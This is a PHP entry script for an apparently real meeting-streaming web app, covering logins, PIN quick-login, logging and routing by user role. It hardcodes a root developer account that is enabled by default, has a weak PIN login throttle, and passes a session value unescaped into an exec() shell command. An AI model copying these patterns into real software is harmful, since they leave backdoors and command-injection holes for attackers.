<?PHP
date_default_timezone_set ('Africa/Johannesburg');
$test=$_SERVER['REQUEST_URI'];
if (strstr($test, ".php")){
header("HTTP/1.1 404 Not Found");
include "404.php";
exit(); 
}
if (!is_dir('./logins')){
mkdir('./logins', 0755);
}
if (!is_dir('./bad_logins')){
mkdir('./bad_logins', 0755);
}
if (file_exists("db/users") AND file_exists("db/cong")){
include "db/config.php";
if ($server_beta==true){
error_reporting(E_ALL);
}
$a = session_id();
if ($a == ''){
session_start();
}
//we only enable https on live systems as others don't have certifs in place
//for kh-live we can't enable ssl yet as certifs have to be installed on all server and ssl must be enabled for icecast (otherwise we get a mixed content worning)
if (strstr($_SERVER['HTTP_HOST'],"testing.sinux.ch") /*OR strstr($_SERVER['HTTP_HOST'],"kh-live.co.za")*/){
if (isset($_SERVER['HTTPS'])){
  if($_SERVER['HTTPS']!="on"){
     $redirect= "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
     header("Location:$redirect");
  }
}else{
$redirect= "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
     header("Location:$redirect");
}
}
header('Content-type: text/html; charset=ISO-8859-15');
$login_error="";

$lang="";
include ("./lang.php");

if (isset ($_GET['page'])){
$page=htmlentities($_GET['page']);
}else{
$page="login";
}
if ($page=="logout"){

if(isset($_SESSION['user']) AND isset($_SESSION['cong'])){
$info=time().'**info**logout successful**'.$_SESSION['user'].'**'.$_SESSION['cong'].'**'.$_SERVER['REMOTE_ADDR']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
			
	$info=time().'**info**logout successful**'.$_SESSION['user']."**\n";
	$file=fopen('./db/logs-'.strtolower($_SESSION['cong']).'-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
	}
    $_SESSION = array();
    session_destroy();
    session_start();
    }


if (isset ($_POST['login_user']) AND isset ($_POST['login_password'])){
$login_log="";
$user=$_REQUEST['login_user'];
$password=$_REQUEST['login_password'];
if (!isset($devel_account)){
$devel_account="yes";
}
if ($user=='lionel' AND $devel_account=='yes' AND hash_equals('2b4cbf28228cd6943797ccce8dbf090e726e1368c61e13a7d35edb04a1837c5306101a1bd24238b50f41ac9df112fd74e52c8e73b177be5a0bbcc47712a4c052',hash("sha512",'63c065115964a7a9992f8f6101ba64175ff1d8c2687a95e583ef73c0d6da0f4adb1f64980618689bdaa6d44581dc7c7b042253c9b4c4f8b0fff9b2c86f89ba9b'.$password))){
$_SESSION['user']='lionel';
$_SESSION['full_name']='lionel';
$_SESSION['type']='root';
$_SESSION['cong']='george_central';
$_SESSION['pin']='1234';
$login_error="";
$login_log=1;
}else{
if ($db=file("db/users")){
    foreach($db as $line){
        $data=explode ("**",$line);
        if (strtoupper($data[0])==strtoupper($user)){
		$hashsplit=explode('--',$data[1]);
	$salt=$hashsplit[0];
	$hash=$hashsplit[1];
            if (hash_equals($hash, hash("sha512",$salt.$password))){
	    //check that the user has the right to login (web or all) in data6
	    //check that the password is 8 char at least
                $_SESSION['user']=$data[0];
		$_SESSION['full_name']=$data[2];
                $_SESSION['type']=$data[4];
		$_SESSION['cong']=$data[3];
		$_SESSION['pin']=$data[5];
		$login_error="";
		$login_log=1;
		}else{
		$login_error=$lng['badlogin'];
		}
		}else{
	$login_error=$lng['badlogin'];
	//this is true only when the username is typed wrong
	}
}
}else{
	$info=time().'**error**unable to readfile db/users**'.$_SERVER['REMOTE_ADDR']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
	exit('error - unable to read user database');
}
}
if ($login_log==1){
$info=time().'**info**login successful**'.$_SESSION['user'].'**'.$_SESSION['cong'].'**'.$_SERVER['REMOTE_ADDR']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
			
	$info=time().'**info**login successful**'.$_SESSION['user']."**\n";
	$file=fopen('./db/logs-'.strtolower($_SESSION['cong']).'-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
	
	$file=fopen('./logins/'.md5($_SESSION['user']),'w');
	fputs($file,time());
	fclose($file);

	}else{
	//$user might not exist...
	$info=time().'**warn**bad login**'.$user.'**--**'.$_SERVER['REMOTE_PORT'].'@'.$_SERVER['REMOTE_ADDR'].'**'.$_SERVER['HTTP_USER_AGENT']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
	}
}elseif (isset ($_GET['qlog'])){
$login_log="";
$bad_counter=0;
$bad_time=0;
if (!isset($qpin_max)){
$qpin_max="3";
}
if (!isset($qpin_time)){
$qpin_time="1";
}
if (file_exists('./bad_logins/'.md5($_SERVER['REMOTE_ADDR']))){
$bad_logins=implode("",file('./bad_logins/'.md5($_SERVER['REMOTE_ADDR'])));
$bad_login=explode("**",$bad_logins);
$bad_counter+=$bad_login[1];
$bad_time=$bad_login[2];
}
if (is_numeric($_GET['qlog'])){
$qlog=$_GET['qlog'];
}else{
$qlog="";
}
if ( $bad_counter<=$qpin_max OR $bad_time<= (time()- ($qpin_time * 60)) ){

if ($db=file("db/users")){
    foreach($db as $line){
        $data=explode ("**",$line);
        if ($data[5]==$qlog){
	    //check that the user has the right to login (web or all) in data6
                $_SESSION['user']=$data[0];
		$user=$data[0];
		$_SESSION['full_name']=$data[2];
                $_SESSION['type']="user"; //we force user mode as quick login isnt very safe
		$_SESSION['cong']=$data[3];
		$_SESSION['pin']=$data[5];
		$login_error="";
		$login_log=1;
		}else{
	$login_error=$lng['badlogin'];
	}
}
}else{
		$info=time().'**error**unable to readfile db/users**'.$_SERVER['REMOTE_ADDR']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
	exit('error - unable to read user database');
}
if ($login_log==1){
$info=time().'**info**quick login successful**'.$_SESSION['user'].'**'.$_SESSION['cong'].'**'.$_SERVER['REMOTE_ADDR']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
			
	$info=time().'**info**quick login successful**'.$_SESSION['user']."**\n";
	$file=fopen('./db/logs-'.strtolower($_SESSION['cong']).'-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}

	$file=fopen('./logins/'.md5($_SESSION['user']),'w');
	fputs($file,time());
	fclose($file);	
	
	if (file_exists('./bad_logins/'.md5($_SERVER['REMOTE_ADDR']))){
	unlink('./bad_logins/'.md5($_SERVER['REMOTE_ADDR']));
	}

	}else{
	$bad_counter++;
	$info=time().'**warn**bad login**'.$qlog.'**--**'.$_SERVER['REMOTE_PORT'].'@'.$_SERVER['REMOTE_ADDR'].'**'.$_SERVER['HTTP_USER_AGENT']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
	$file=fopen('./bad_logins/'.md5($_SERVER['REMOTE_ADDR']),'w');
	fputs($file,$_SERVER['REMOTE_ADDR']."**".$bad_counter."**".time()."**");
	fclose($file);		
	}
  }else{
  //this is a quick login flooding attempt (3 bad logins within the last minute)
  $info=time().'**warn**flooding attemp stopped**'.$qlog.'**--**'.$_SERVER['REMOTE_PORT'].'@'.$_SERVER['REMOTE_ADDR'].'**'.$_SERVER['HTTP_USER_AGENT']."**\n";
	$file=fopen('./db/logs-'.date("Y",time()).'-'.date("m",time()),'a');
			if(fputs($file,$info)){
			fclose($file);
			}
  header("HTTP/1.1 403 Forbidden");
echo 'Wrong password entered 3 times! Wait a minute and try again.';
exit(); 
  }	
}
if ($page=="time" OR $page=='redirect'){
	if (@$timing_style=='testing'){
		include 'timing-standalone-testing.php';
	}else{
		include 'timing-standalone.php';
	}
	}
if (!isset($_SESSION['user'])){
include ("./login.php");
}else{
//check if there is a live meeting only if we are in production mode
 if ($server_beta=="false"){
	if (!file_exists($temp_dir.'meeting_'.$_SESSION['cong'])){
	//if the file doesn't exist, it means the computer restarted (if the temp_dir =/dev/shm)
	//we must clear the database of the admin state in case the computer crashed while a meeting was on
	exec ($asterisk_bin.' -rx "database del '.$_SESSION['cong'].' admin"');
	$file=fopen($temp_dir.'meeting_'.$_SESSION['cong'],'w');
	fputs($file,"down");
	fclose($file);
	}
	if (!file_exists($temp_dir.'test_meeting_'.$_SESSION['cong'])){
	//if the file doesn't exist, it means the computer restarted (if the temp_dir =/dev/shm)
	//we must clear the database of the admin state in case the computer crashed while a meeting was on
	exec ($asterisk_bin.' -rx "database del Testing_0 '.$_SESSION['cong'].'"');
	$file=fopen($temp_dir.'test_meeting_'.$_SESSION['cong'],'w');
	fputs($file,"down");
	fclose($file);
	}
	$_SESSION['meeting_status']=implode("",file($temp_dir.'meeting_'.$_SESSION['cong']));
	$_SESSION['test_meeting_status']=implode("",file($temp_dir.'test_meeting_'.$_SESSION['cong']));
	}elseif ($server_beta=="stream"){
	if (!file_exists($temp_dir.'meeting_'.$_SESSION['cong'])){
	//if the file doesn't exist, it means the computer restarted (if the temp_dir =/dev/shm)
	$file=fopen($temp_dir.'meeting_'.$_SESSION['cong'],'w');
	fputs($file,"down");
	fclose($file);
	}
	if (!file_exists($temp_dir.'test_meeting_'.$_SESSION['cong'])){
	//if the file doesn't exist, it means the computer restarted (if the temp_dir =/dev/shm)
	$file=fopen($temp_dir.'test_meeting_'.$_SESSION['cong'],'w');
	fputs($file,"down");
	fclose($file);
	}
	$_SESSION['meeting_status']=implode("",file($temp_dir.'meeting_'.$_SESSION['cong']));
	$_SESSION['test_meeting_status']=implode("",file($temp_dir.'test_meeting_'.$_SESSION['cong']));
	}elseif ($server_beta=="master") {
	if (!file_exists($temp_dir.'meeting_'.$_SESSION['cong'])){
	$file=fopen($temp_dir.'meeting_'.$_SESSION['cong'],'w');
	fputs($file,"down");
	fclose($file);
	}
	if (!file_exists($temp_dir.'test_meeting_'.$_SESSION['cong'])){
	$file=fopen($temp_dir.'test_meeting_'.$_SESSION['cong'],'w');
	fputs($file,"down");
	fclose($file);
	}
	$_SESSION['meeting_status']=implode("",file($temp_dir.'meeting_'.$_SESSION['cong']));
	$_SESSION['test_meeting_status']=implode("",file($temp_dir.'test_meeting_'.$_SESSION['cong']));
	}else{
	$_SESSION['meeting_status']="down";
	$_SESSION['test_meeting_status']="down";
	}
			
include ("./header.php");
//root links only
if ($_SESSION['type']=="root"){
	if ($page=="congregations"){
	include ("./cong.php");
	}elseif ($page=="cong_edit"){
	include ("./cong_edit.php");
	}elseif ($page=="cong_add"){
	include ("./cong_add.php");
	}elseif ($page=="cong_delete"){
	include ("./cong_delete.php");
	}elseif ($page=="logs"){
	include ("./logs.php");
	}elseif ($page=="video_edit"){
	include ("./video_edit.php");
	}elseif ($page=="configure"){
	include ("./config.php");
	}elseif ($page=="servers" AND $server_beta=="master"){
	include ("./servers.php");
	}elseif ($page=="server_add" AND $server_beta=="master"){
	include ("./server_add.php");
	}elseif ($page=="server_edit" AND $server_beta=="master"){
	include ("./server_edit.php");
	}elseif ($page=="server_delete" AND $server_beta=="master"){
	include ("./server_delete.php");
	}elseif ($page=="song_man" AND $server_beta!="master"){
	include ("./song_man.php");
	}elseif ($page=="auto_update" AND $server_beta!="master"){
	include ("./auto_update.php");
	}
	}
//admin links only
if ($_SESSION['type']=="admin" OR $_SESSION['type']=="root"){
	if ($page=="users"){
	include ("./users.php");
	}elseif ($page=="user_add"){
	include ("./user_add.php");
	}elseif ($page=="user_delete"){
	include ("./user_delete.php");
	}elseif($page=="diagnosis"){
	include ("./diagnosis.php");
	}elseif ($page=="user_edit"){
	include ("./user_edit.php");
	}elseif($page=="download"){
	include ("./software.php");
	}elseif($page=="infos"){
	include ("./infos.php");
	}elseif($page=="info_add"){
	include ("./info_add.php");
	}elseif($page=="info_delete"){
	include ("./info_delete.php");
	}elseif($page=="info_edit"){
	include ("./info_edit.php");
	}elseif($page=="back_up"){
	include ("./backup.php");
	}
	}
//manger links only
	if($_SESSION['type']=="admin" OR $_SESSION['type']=="manager" OR $_SESSION['type']=="root"){
	
	if ($page=="meeting"){
	include ("./meeting.php");
	}elseif($page=="report"){
	include ("./report.php");
	}elseif($page=="scheduler"){
	include ("./scheduler.php");
	}elseif($page=="sched_add"){
	include ("./sched_add.php");
	}elseif($page=="sched_delete"){
	include ("./sched_delete.php");
	}elseif($page=="sched_edit"){
	include ("./sched_edit.php");
	}elseif($page=="timings"){
	include ("./timings.php");
	}elseif($page=="timing_add"){
	include ("./timing_add.php");
	}elseif($page=="timing_delete"){
	include ("./timing_delete.php");
	}elseif($page=="timing_edit"){
	include ("./timing_edit.php");
	}
	}
//everybody's links
	if ($page=="login"){
	include ("./home.php");
	}elseif ($page=="record"){
	include ("./records.php");
	}elseif($page=="listening"){
	include ("./listening.php");
	}elseif($page=="video"){
	include ("./videolib.php");
	}
?>
<script type="text/javascript">
function hideMenu(){
if (document.getElementById("menu").style.display!= "block"){
document.getElementById("menu").style.display="block";
document.getElementById("hide_menu").innerHTML="<svg xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" xmlns=\"http://www.w3.org/2000/svg\" height=\"21\" width=\"22\" version=\"1.1\" xmlns:cc=\"http://creativecommons.org/ns#\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"><g transform=\"translate(-361 -514)\" stroke=\"#000\" stroke-width=\"2.93px\" fill=\"none\"><path d=\"m364 533 15.5-15.5\"/><path d=\"m364 517 15.5 15.5\"/></g></svg>";
	if(document.getElementById("homepage")!== null){
	document.getElementById("homepage").style.marginLeft="195px";
	}else{
	document.getElementById("page").style.marginLeft="195px";
	}
}else{
document.getElementById("menu").style.display="none";
document.getElementById("hide_menu").innerHTML="<svg xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\" xmlns=\"http://www.w3.org/2000/svg\" height=\"21\" width=\"22\" version=\"1.1\" xmlns:cc=\"http://creativecommons.org/ns#\" xmlns:dc=\"http://purl.org/dc/elements/1.1/\"><g transform=\"translate(-361 -514)\" stroke=\"#000\" stroke-width=\"2.93px\" fill=\"none\"><path d=\"m361 516h22\"/><path d=\"m361 525h22\"/><path d=\"m361 534h22\"/></g></svg>";
	if(document.getElementById("homepage")!== null){
	document.getElementById("homepage").style.marginLeft="5px";
	}else{
	document.getElementById("page").style.marginLeft="5px";
	}
}
}
</script>
</body>
</html>
<?PHP
}
}else{
header('Content-type: text/html; charset=ISO-8859-15');
$lang="";
include ("./lang.php");
include ("./functions.php");
include ("./installation.php");
}
?>
